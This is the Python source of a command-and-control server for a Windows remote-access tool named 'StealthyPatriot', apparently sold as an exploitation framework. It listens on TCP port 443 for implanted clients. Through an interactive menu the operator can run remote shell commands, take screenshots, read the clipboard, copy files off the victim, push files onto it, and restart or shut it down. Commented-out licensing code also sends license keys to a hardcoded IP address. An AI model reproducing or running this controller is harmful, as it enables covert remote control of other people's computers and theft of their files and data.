# This software and its documentation are confidential and proprietary
# information of Rythen Research. No part of the software and
# documents may be copied, reproduced, transmitted, translated, or reduced to
# any electronic medium or machine-readable form without the prior written
# consent of Rythen Research.
#
# Rythen Research makes no representation with respect to the contents,
# and assumes no responsibility for any misuse of the software and documents.
# This publication and the contents hereof are subject
# to change without a memorandum
import socket
import time
import platform
import os
import base64
import random, string
from colorama import Fore, Back, Style
import ctypes
import sys
from datetime import datetime
import argparse
import requests
now = datetime.today()
dataaa = (datetime.utcnow().strftime('%Y-%m-%d %H-%M-%S-%f')[:-3])
def get_arguments():
    parser = argparse.ArgumentParser()
    parser.add_argument("-l", "--license", dest= "license", help= "License is required in order to start the program, you got the license in your email when you purchased it from us", required=False)
    options = parser.parse_args()
    return options
options = get_arguments()
#from licensing.models import *
#from licensing.methods import Key, Helpers
#RSAPubKey = "<RSAKeyValue><Modulus>nGFUVaKpYOQFaRedJzxIjcO3EcDc0cg4eXoF+ghevSBksUaaMEAHcDug8YXNfxQQ1UZYWKKWGHwGfOzAGllhPU2UwMQ4CWR8KF7uTPk5tzYwKryNLg0clnM7vMxkgTZEfVQPQHYoqxIvA42xdSGWNibvZzSQWukA2bPW1EAJShqHwuxb67PGY3nqHoSjMdExz9Sb9s8W2OPpghmn49SiwtjZ0vObhjowzca4ppgtsgtltdWEWDkXbs31aFHpEk76mVL7v2Tl04bqsEt/mAtIFbwDJgYbGjR49h4qtC74GG1wnIiYIYbiszC6bi4wZgPnNnSK9jIFgySwBMqkI+UYUw==</Modulus><Exponent>AQAB</Exponent></RSAKeyValue>"
#auth = "WyIxNzM5ODc1MCIsIkJmVmVFSFhodWQxK2ozVWtkd1p5UUhBOGJ2NG01NE5CTGFoWXFYbFoiXQ=="
os_platform=platform.uname()
#result = Key.activate(token=auth,\
                   #rsa_pub_key=RSAPubKey,\
                   #product_id=14980, \
                   #key=f"{options.license}",\
                   #machine_code=Helpers.GetMachineCode())

#if result[0] == None or not Helpers.IsOnRightMachine(result[0]):
    # an error occurred or the key is invalid or it cannot be activated
    # (eg. the limit of activated devices was achieved)
    #headers = {'License used for authentication (License did not work)': options.license, 'Content-Type': 'application/json; charset=utf-8'}
    #response = requests.get("http://209.250.250.226:8080", headers=headers)   # modify request headers 
    #print(response.headers)                         # print response headers 
    #print(response.headers['Content-Type'])         # output: application/json; charset=utf-8 
    #print("The license does not work: {0}".format(result[1]))
    #exit()
#else:
    #pass
    #headers = {'License used for authentication (License verified)': options.license, 'Content-Type': 'application/json; charset=utf-8'}
    #response = requests.get("http://209.250.250.226:8080", headers=headers)   # modify request headers 
    #print(response.headers)                         # print response headers 
    #print(response.headers['Content-Type'])         # output: application/json; charset=utf-8 
    #print("The license is valid!")
def Clear():
    if platform.system() == "Windows":
        os.system('cls')
    else:
        os.system("clear")
Clear()
time.sleep(1)
def banner():
    print(f"""{Fore.WHITE}  
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}WWX0OKW{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}WNKOxoox0NWNXNW{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}WWX0kdodk0KXKOxolkN{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}WKxdoxOKXX0kdllox0XX0kdON{Fore.RESET}MMMMMMM{Fore.BLUE}Nkoooooox0N{Fore.RESET}MMMMMMMMMMMMMMMM{Fore.BLUE}Nko0W{Fore.RESET}MMM{Fore.BLUE}KdxX{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}Nkld0NX0xolldkKXKOdl:;;lKW{Fore.RESET}MMMMMM{Fore.BLUE}0' .:::,..cX{Fore.RESET}MMMMMMMMMMMMMMM{Fore.BLUE}0, lN{Fore.RESET}MM{Fore.BLUE}Wd .O{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}NxcdXNkccxOKX0koc:lxkl;lK{Fore.RESET}MMMMMMM{Fore.BLUE}0' lW{Fore.RESET}MM{Fore.BLUE}X: .OKxxK{Fore.RESET}MMMMM{Fore.BLUE}KxxK0dc. 'odONo .ldlld0W{Fore.RESET}MM{Fore.BLUE}WXkolod0W{Fore.RESET}M{Fore.BLUE}W0dxxoloxKW{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}NxcdXNx:oKNOl:cok0NWXo,lK{Fore.RESET}MMMMMMM{Fore.BLUE}0' .:cc;..oXK; ,0{Fore.RESET}MM{Fore.BLUE}W0, ;0k:,. .;:dXd  .::'..dWNd'.:c:..lXNc .,::. 'OW{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}Xd:oXNd;oKXd;l0NWNKko:,oX{Fore.RESET}MMMMMMM{Fore.BLUE}0' ,c. .oKW{Fore.RESET}MM{Fore.BLUE}K; ,0Oo, :K{Fore.RESET}MMM{Fore.BLUE}0' cN{Fore.RESET}MM{Fore.BLUE}Wd .kW{Fore.RESET}M{Fore.BLUE}X: ,KO. 'cll, .xN: ,0{Fore.RESET}M{Fore.BLUE}WO' cN{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}Xd;oKXd;oKXd;lKNOl;,:dOXW{Fore.RESET}MMMMMMM{Fore.BLUE}0' lNO,.,OW{Fore.RESET}MMM{Fore.BLUE}K; .. .:X{Fore.RESET}MM{Fore.RESET}MM{Fore.BLUE}K, cN{Fore.RESET}MM{Fore.BLUE}Wd .O{Fore.RESET}MM{Fore.BLUE}Nc ,KO. ,odddldXN: ;X{Fore.RESET}MM{Fore.BLUE}K, cN{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}Nd;oXNd;oKXo,lKNOl;,:dOXW{Fore.RESET}MMMMMMM{Fore.BLUE}0' lW{Fore.RESET}M{Fore.BLUE}Xc..oN{Fore.RESET}MMM{Fore.BLUE}0,  .cX{Fore.RESET}MMMMM{Fore.BLUE}Xc .:lkNd .O{Fore.RESET}MM{Fore.BLUE}Nc ,KNo..:ll:,oNN: ;{Fore.BLUE}X{Fore.RESET}MM{Fore.BLUE}K, cN{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}WXOKWNd,lKXo,lKWMWKko::kW{Fore.RESET}MMMMMMM{Fore.BLUE}Nko0W{Fore.RESET}MM{Fore.BLUE}NkoxK{Fore.RESET}MM{Fore.BLUE}Wk..l0X{Fore.RESET}MMMMMMM{Fore.BLUE}XklclkWKdxX{Fore.RESET}MM{Fore.BLUE}WOokN{Fore.RESET}M{Fore.BLUE}WKxlccokXWWOokN{Fore.RESET}MM{Fore.BLUE}NkoOW{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}WOlxNXo,lK{Fore.RESET}MMMMMWXKNWMMMMMMMMMMMMMMMMMMMM{Fore.BLUE}Wx..lN{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}WWWMNo'lK{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.BLUE}XdcxN{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM{Fore.RED}W0x0N{Fore.RESET}MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM
MMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMMM

                            {Fore.YELLOW}[===]                                    {Fore.BLUE}StealthyPatriot - Exploitation Framework for Windows Devices                           {Fore.YELLOW}[===]
                            
                            {Fore.YELLOW}[===]                                       {Fore.BLUE}      Created with <3 by {Fore.RED}Rythen Research                                            {Fore.YELLOW}[===]
                            {Fore.YELLOW}[===]                                       {Fore.BLUE}      Version: 1.0.0 Enterprise({Fore.GREEN}BETA{Fore.BLUE})                                               {Fore.YELLOW}[===]        
                            {Fore.YELLOW}[===]                                       {Fore.BLUE}      Follow us on Twitter: {Fore.RED}@rythensec                                              {Fore.YELLOW}[===]
                            {Fore.YELLOW}[===]                                       {Fore.BLUE}      Website: {Fore.MAGENTA}https://www.rythen.com                                               {Fore.YELLOW}[===]
                            {Fore.YELLOW}[===]           {Fore.BLUE}      Welcome to the {Fore.LIGHTGREEN_EX}StealthyPatriot Framework{Fore.BLUE}. Developed by Rythen for cyber security companies                {Fore.YELLOW}[===]
  
{Fore.RESET}""")
banner()
#print(f"{Fore.RED} Daily Tip:{Fore.WHITE} {random.choice(open('misc/daily_tip.txt').readlines())}")


def Menu():
    print(f"""
    {Fore.GREEN}Listeners             Description
    ---------             -----------
    {Fore.RED}1                      StealthyPatriot payload listener
    
    """,)
    print()

s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)
global ListenerHost
global ListenerPort
global file_name

def SingleListener():
    try:
        hostname = socket.gethostname()
        local_ip = socket.gethostbyname(hostname)
        ListenerHost = local_ip
        ListenerPort = 443
        while True:
            landingHandler = input(f"{Fore.WHITE}{Style.BRIGHT}StealthyPatriot {Style.RESET_ALL}{Fore.WHITE}windows{Fore.RED}{Style.BRIGHT}(merciless/){Fore.WHITE}{Style.BRIGHT} > ")
            if landingHandler == "show payloads" or landingHandler == "list payloads" or landingHandler == "payloads" or landingHandler == "payloads list":
                print(f'''
                {Fore.GREEN}Payload                                    Description
                -------                                     -----------
                {Fore.RED}1 windows/merciless/single/handler                  Merciless Windows single command handler
                {Fore.RED}2 linux/merciless/single/handler                  Merciless Windows single command handler   
                {Fore.BLUE}[*]{Fore.WHITE} Select a payload by typing it's name or "use [Number]" for example: "use 1"
                ''')
            if landingHandler == "use merciless/single/handler" or "use windows/merciless/single/handler" or landingHandler ==  "use 1" or landingHandler == "use merciless/single/handler" or landingHandler == "merciless/single/handler":
                    while True:
                        firstHandler = input(f"{Fore.WHITE}{Style.BRIGHT}StealthyPatriot {Style.RESET_ALL}{Fore.WHITE}exploitation{Fore.RED}{Style.BRIGHT}(merciless/single/handler){Fore.WHITE}{Style.BRIGHT} > ")
                        if firstHandler[:8] == "set host":
                            ListenerHost = firstHandler[9:]
                            print(f"Host => {Fore.GREEN}{ListenerHost}")
                        if firstHandler == "set host":
                            ListenerHost = "0.0.0.0"
                            print(f"Host => {Fore.GREEN}{ListenerHost}")
                        if firstHandler[:8] == "set port":
                            ListenerPort = firstHandler[9:]
                            print(f"Port => {Fore.GREEN}{ListenerPort}")
                        if firstHandler == "set port":
                            ListenerPort = 4434
                            print(f"Port => {Fore.GREEN}{ListenerPort}")
                        if firstHandler == "options" or  landingHandler == "show options" or landingHandler == "show Options" or landingHandler == "show OPTIONS":
                            print(f'''



                            {Fore.GREEN}Option                     Current Setting
                            ------                     ---------------
                            {Fore.RED}Host                       {ListenerHost}
                            {Fore.RED}Port                       {ListenerPort}


                            {Fore.BLUE}[*] {Fore.WHITE}{Fore.RED}Tip:{Fore.WHITE} Set an option by typing "set [name]". For example: "set host 10.10.10.23"
                            ''')
                        if firstHandler == "run" or firstHandler == "exploit":
                            try:
                                s.bind((ListenerHost, int(ListenerPort)))
                            except OSError:
                                print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Invalid listener address, listening on 0.0.0.0")
                                ListenerHost = "0.0.0.0"
                                s.bind((ListenerHost, int(ListenerPort)))
                            time.sleep(1)
                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Starting listener...")
                            try:
                                s.listen()
                            except socket.error:
                                print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Error while starting listener.")
                            time.sleep(1)
                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Started TCP handler on {ListenerHost}:{ListenerPort}")
                            print(f"{Fore.BLUE}[*]{Fore.WHITE} Handler started, waiting for connection")
                            conn, addr = s.accept()
                            s.setblocking(1)
                            clientIP = s.getsockname()
                            with conn:
                                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Merciless session opened ({ListenerHost}:{ListenerPort} <--> {clientIP}) at {dataaa}")
                                    time.sleep(1)
                                    print(f"{Fore.GREEN}[+]{Fore.WHITE} Connecting to Device.")
                                    while True:

                                        Handler = input(f"{Fore.WHITE}{Style.BRIGHT}Merciless {Style.RESET_ALL}> ")
                                        if Handler == "clear":
                                            if platform.system() == "Linux":
                                                os.system('clear')
                                            else:
                                                os.system("cls")
                                        elif Handler == "screenshot":
                                            conn.send(Handler.encode("utf-8"))
                                            data = conn.recv(20971520)
                                            if data:
                                                with open("base64.txt", "wb") as f:
                                                    f.write(data)
                                                    import base64
                                                    f=open('base64.txt', 'r')
                                                    string=f.read()
                                                    f.close()
                                                    image=base64.b64decode(string)
                                                    f=open('screenshot.jpg', 'wb')
                                                    f.write(image) # here the magic happens 
                                                    f.close()
                                            else:
                                                print("Didn't get it...")
                                        elif Handler == "netDiscover":
                                            # Receive data from the client and print it to the console
                                            expected_data_size = 1024 # Expected size of data from client
                                            total_received_size = 0 # Total size of received data
                                            while True:
                                                data = conn.recv(1024)
                                                if not data:
                                                    break
                                                total_received_size += len(data)
                                                print(data.decode())
                                                if total_received_size >= expected_data_size:
                                                    break
                                        elif Handler == "exit":
                                            conn.send(Handler.encode("utf-8"))
                                            print(f"{Fore.BLUE}[*] Exiting From Active Session...")
                                            time.sleep(3)
                                            conn.close()
                                        elif Handler == "restart":
                                            conn.send(Handler.encode("utf-8"))
                                        elif Handler == "shutdown":
                                            conn.send(Handler.encode("utf-8"))
                                        elif Handler == "shell":
                                            conn.send(Handler.encode("utf-8"))
                                            cwd = 'Shell'
                                            r = conn.recv(5120).decode('utf-8')
                                            if ('dir:' in r):
                                                cwd = r[4:]
                                            while True:
                                                command = input(str(cwd)+"> ")
                                                if 'terminate' in command:
                                                    conn.send('terminate'.encode('utf-8'))
                                                    conn.close()
                                                    break
                                                elif 'clipboard' in command:
                                                    conn.send(command.encode('utf-8'))
                                                    data = conn.recv(5120).decode("utf-8")
                                                    print(f"[{Fore.GREEN}CLIPBOARD{Fore.WHITE}] " + str(data))
                                                elif 'grab' in command:
                                                    conn.send(command.encode('utf-8'))
                                                    file_name = conn.recv(5120).decode('utf-8')
                                                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Downloading " + file_name + "...")
                                                    file_size = conn.recv(5120).decode('utf-8')
                                                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Total: " + str(int(file_size)/1024) + " KB")
                                                    with open(file_name, "wb") as file:
                                                        c = 0
                                                        start_time = time.time()
                                                        while c < int(file_size):
                                                            data = conn.recv(5120)
                                                            if not (data):
                                                                break
                                                            file.write(data)
                                                            c += len(data)
                                                        end_time = time.time()
                                                    print(f"{Fore.GREEN}[+]{Fore.WHITE} File Downloaded.")
                                                elif 'transfer' in command:
                                                    conn.send(command.encode('utf-8'))
                                                    file_name = command[9:]
                                                    file_size = os.path.getsize(file_name)
                                                    conn.send(file_name.encode('utf-8'))
                                                    conn.send(str(file_size).encode('utf-8'))
                                                    print(f"{Fore.BLUE}[*]{Fore.WHITE} Transferring [" + str(file_size/1024) + "] KB...")
                                                    with open(file_name, "rb") as file:
                                                        c = 0
                                                        start_time = time.time()
                                                        while c < int(file_size):
                                                            data = file.read(5120)
                                                            if not (data):
                                                                break
                                                            conn.sendall(data)
                                                            c += len(data)
                                                        end_time = time.time()
                                                        print(f"{Fore.GREEN}[+]{Fore.WHITE} File Transferred.")
                                                elif (len(command.strip()) > 0):
                                                    conn.send(command.encode('utf-8'))
                                                    r = conn.recv(5120).decode('utf-8')
                                                    if ('dir:' in r):
                                                        cwd = r[4:]
                                                    else:
                                                        print (r)
    except KeyboardInterrupt:
        return Handler

    except ConnectionResetError:
        print(f"{Fore.RED}[-]{Fore.WHITE} Lost Connection {Fore.GREEN}[REASON]{Fore.WHITE}: Client Closed Connection.")
    #except KeyboardInterrupt:
        #print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Keyboard Interruption.")
    except KeyboardInterrupt:
        print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Keyboard Interruption.")
        exit()
while True:
    try:
        des = input(f"{Fore.WHITE}{Style.BRIGHT}StealthyPatriot {Style.RESET_ALL}{Fore.WHITE}landing{Fore.RED}{Style.BRIGHT}(stealthypatriot/framework){Fore.WHITE}{Style.BRIGHT} > ")
        if des == "use 1" or des == "1":
            SingleListener()
        if des == "list show":
            Menu()
        if des == "list":
            Menu()
        if des == "show list":
            Menu()
        if des == "exit":
            exit()
        if des == "Exit":
            exit()
    except KeyboardInterrupt:
        print(f"{Fore.RED}[-]{Fore.WHITE} ERROR {Fore.GREEN}[REASON]{Fore.WHITE}: Keyboard Interruption.")
        exit()
